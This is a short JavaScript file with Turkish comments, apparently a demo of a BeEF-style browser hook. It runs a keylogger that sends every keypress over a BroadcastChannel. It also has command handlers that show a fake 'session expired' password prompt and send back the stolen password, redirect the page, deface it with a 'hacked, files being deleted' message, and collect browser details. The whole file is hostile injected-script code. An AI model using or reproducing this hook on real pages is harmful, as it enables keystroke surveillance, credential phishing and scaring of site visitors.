// hook.js - Gelişmiş Dinleyici
(function() {
    // Saldırganla iletişim kanalı kur
    const channel = new BroadcastChannel('beef_channel');

    console.log("Kanca yerleştirildi, bağlantı bekleniyor...");

    // 1. MODÜL: Keylogger (Tuş Kaydedici)
    // Kurbanın bastığı her tuşu saldırgan paneline gönderir
    document.addEventListener('keypress', function(e) {
        channel.postMessage({
            type: 'log',
            data: `Kurban tuşladı: ${e.key}`
        });
    });

    // 2. MODÜL: Komut İşleyici
    channel.onmessage = (event) => {
        const { command, value } = event.data;
        
        switch(command) {
            case 'PHISHING':
                const pass = prompt("Oturumunuzun süresi doldu. Lütfen devam etmek için şifrenizi girin:");
                channel.postMessage({ type: 'log', data: `Çalınan Şifre: ${pass}` });
                break;
            case 'REDIRECT':
                window.location.href = value;
                break;
            case 'CHANGE_UI':
                document.body.innerHTML = `<div style="background:white; color:red; padding:50px;"><h1>HACKLENDİNİZ</h1><p>Sistem dosyaları siliniyor...</p></div>`;
                break;
            case 'GET_INFO':
                channel.postMessage({
                    type: 'log',
                    data: `Tarayıcı: ${navigator.userAgent} | Dil: ${navigator.language}`
                });
                break;
        }
    };
})();